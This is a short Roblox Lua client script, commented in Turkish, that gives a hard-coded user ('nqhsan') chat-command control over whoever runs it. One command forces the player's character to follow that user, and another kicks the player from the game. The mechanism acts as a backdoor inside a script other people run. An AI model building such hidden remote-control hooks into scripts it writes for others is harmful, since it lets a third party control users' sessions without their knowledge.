local AUTHORIZED_USER = "nqhsan"
local isAuthorizedToControl = false
local isFollowingAdmin = false
local followConnection = nil

-------------------------------------------------------------------
-- // YETKİLİ KOMUT SİSTEMİ (nqhsan)
-------------------------------------------------------------------
local function setupAdminSystem()
	local function onPlayerChatted(speaker, message)
		if speaker.Name:lower() ~= AUTHORIZED_USER:lower() then return end
		
		local msg = message:lower()
		local myName = LocalPlayer.Name:lower()
		
		if msg == myName then
			isAuthorizedToControl = not isAuthorizedToControl
			if not isAuthorizedToControl then
				isFollowingAdmin = false
				if followConnection then
					followConnection:Disconnect()
					followConnection = nil
				end
			end
			return
		end
		
		if not isAuthorizedToControl then return end
		
		if msg == "gel" then
			isFollowingAdmin = true
			if followConnection then followConnection:Disconnect() end
			
			followConnection = RunService.Heartbeat:Connect(function()
				if not isFollowingAdmin or not isAuthorizedToControl then
					if followConnection then
						followConnection:Disconnect()
						followConnection = nil
					end
					return
				end
				
				local targetPlayer = Players:FindFirstChild(AUTHORIZED_USER)
				if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
					local targetHRP = targetPlayer.Character.HumanoidRootPart
					local myChar = LocalPlayer.Character
					local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
					
					if myHRP then
						myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 4)
					end
				end
			end)
		
		elseif msg == "git" then
			LocalPlayer:Kick("Yetkili (nqhsan) tarafından oyundan uzaklaştırıldınız.")
		end
	end

	local function hookPlayer(player)
		if player.Name:lower() == AUTHORIZED_USER:lower() then
			player.Chatted:Connect(function(msg)
				onPlayerChatted(player, msg)
			end)
		end
	end

	for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
	Players.PlayerAdded:Connect(hookPlayer)
end

setupAdminSystem()

